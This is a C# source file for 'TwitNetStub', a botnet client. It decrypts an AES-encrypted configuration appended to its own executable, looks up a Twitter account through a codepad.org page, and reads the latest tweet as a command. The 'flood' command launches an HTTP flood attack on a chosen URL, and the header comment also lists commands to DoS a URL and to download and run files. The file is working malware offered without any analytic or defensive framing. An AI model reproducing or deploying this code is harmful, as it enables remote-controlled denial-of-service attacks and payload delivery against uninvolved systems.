/*Commands:
 * visit URL - DOS the url
 * get FILENAME - download/run file
 * 
 * 
 * 
 *
 */
using System;
using System.Text;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using System.Text.RegularExpressions;
using System.Xml;
using TwitNetStub.Commands;
using TwitNetStub.Util.Encryption;
using TwitNetStub.Util.Misc;
using TwitNetStub.Util.Network;

namespace TwitNetStub
{
    sealed partial class Main
    {

        #region Singleton
        static Main _instance = null;
        static readonly object PadLock = new object();

        public static Main Instance
        {
            get
            {
                lock (PadLock)
                {
                    return _instance ?? (_instance = new Main());
                }
            }
        }
        #endregion

        public void Start()
        {
            //Grab file contents
            byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
            string appendData = Strings.Split(Encoding.Default.GetString(stub), Constants.Splitter)[1];

            //Do first decrypt with default key
            SimpleAES defaultAES = new SimpleAES();
            defaultAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
            appendData = defaultAES.DecryptString(appendData);

            //k so now you have (Encrypted url)|split|key
            string encryptedName = Strings.Split(appendData, Constants.Splitter)[0];
            Constants.CustomEncryptionKey = Strings.Split(appendData, Constants.Splitter)[1]; //Grab key
            defaultAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
            string user = defaultAES.DecryptString(encryptedName);

            WebClient client = new WebClient();
            string codepad = client.DownloadString("http://" + user + ".codepad.org/");
            string twitUser = Regex.Split(codepad, "<pre>http://twitter.com/")[1].Split('<')[0].Trim();

            string tweet = Twitter.GetTweet(client.DownloadString("http://api.twitter.com/1/statuses/user_timeline/" + twitUser + ".xml"));
            string command = Strings.Split(tweet, Constants.CommandSplitter)[0];
            string arg = Strings.Split(tweet, Constants.CommandSplitter)[1];

            IBotOperation op;
            switch(command.ToLower())
            {
                case "flood":
                    op = new HTTPFlood(arg);
                    break;
                default:
                    //If the command cant be identified, fuck it!
                    return;
            }
            op.Initialize();
            op.Run();
        }
    }
}
